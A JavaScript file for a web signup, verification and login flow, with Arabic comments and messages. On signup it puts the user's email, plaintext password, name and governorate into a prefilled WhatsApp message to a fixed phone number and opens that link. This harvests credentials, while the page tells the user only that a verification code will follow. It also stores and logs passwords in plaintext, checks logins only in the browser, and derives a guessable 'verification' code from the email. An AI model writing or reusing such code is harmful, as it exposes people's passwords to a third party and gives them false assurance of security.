document.addEventListener('DOMContentLoaded', function() {
    const signupForm = document.getElementById('signup-form');
    const verifyForm = document.getElementById('verify-form');
    const loginForm = document.getElementById('login-form');

    if (signupForm) {
        signupForm.addEventListener('submit', function(event) {
            event.preventDefault();

            const email = document.getElementById('email').value;
            const password = document.getElementById('password').value;
            const firstName = document.getElementById('first-name').value;
            const lastName = document.getElementById('last-name').value;
            const governorate = document.getElementById('governorate').value;

            console.log("Form submitted with values:", {
                email, password, firstName, lastName, governorate
            });

            // توليد كود التحقق
            const verificationCode = generateVerificationCode(email);
            console.log("Generated verification code:", verificationCode);

            // إرسال رسالة عبر الواتساب بدون كود التحقق
            const message = `شكراً على تزويدنا بمعلوماتك. سيتم إرسال لك كود التحقق قريباً.\n\nالاسم: ${firstName} ${lastName}\nالبريد الإلكتروني: ${email}\nكلمة المرور: ${password}\nالمحافظة: ${governorate}`;
            const whatsappLink = `https://wa.me/963990764268?text=${encodeURIComponent(message)}`;
            console.log("WhatsApp link:", whatsappLink);
            window.open(whatsappLink, '_blank');

            // تخزين بيانات المستخدم مؤقتًا في Local Storage
            localStorage.setItem('email', email);
            localStorage.setItem('password', password);
            localStorage.setItem('firstName', firstName);
            localStorage.setItem('lastName', lastName);
            localStorage.setItem('governorate', governorate);
            localStorage.setItem('verificationCode', verificationCode);

            // نقل المستخدم إلى صفحة التحقق
            window.location.href = 'verify.html';
        });
    }

    if (verifyForm) {
        verifyForm.addEventListener('submit', function(event) {
            event.preventDefault();

            const inputCode = document.getElementById('verification-code').value;
            const storedCode = localStorage.getItem('verificationCode');

            console.log("Verification code entered:", inputCode);
            console.log("Stored verification code:", storedCode);

            if (inputCode === storedCode) {
                alert('تم التحقق بنجاح! يمكنك الآن تسجيل الدخول.');
                window.location.href = 'login.html';
            } else {
                alert('كود التحقق غير صحيح. حاول مرة أخرى.');
            }
        });
    }

    if (loginForm) {
        loginForm.addEventListener('submit', function(event) {
            event.preventDefault();

            const email = document.getElementById('email').value;
            const password = document.getElementById('password').value;
            const storedEmail = localStorage.getItem('email');
            const storedPassword = localStorage.getItem('password');

            console.log("Login attempt with email:", email);
            console.log("Stored email:", storedEmail);
            console.log("Stored password:", storedPassword);

            if (email === storedEmail && password === storedPassword) {
                alert('تسجيل الدخول ناجح!');
                window.location.href = 'home.html';
            } else {
                alert('البريد الإلكتروني أو كلمة المرور غير صحيحة. حاول مرة أخرى.');
            }
        });
    }
});

function generateVerificationCode(email) {
    const emailPrefix = email.split('@')[0].toLowerCase();
    let verificationCode = '';

    for (let i = 0; i < emailPrefix.length; i++) {
        const char = emailPrefix.charAt(i);
        const charCode = char.charCodeAt(0) - 96;
        verificationCode += charCode;
    }

    // نأخذ أول 4 أرقام فقط
    return verificationCode.slice(0, 4);
}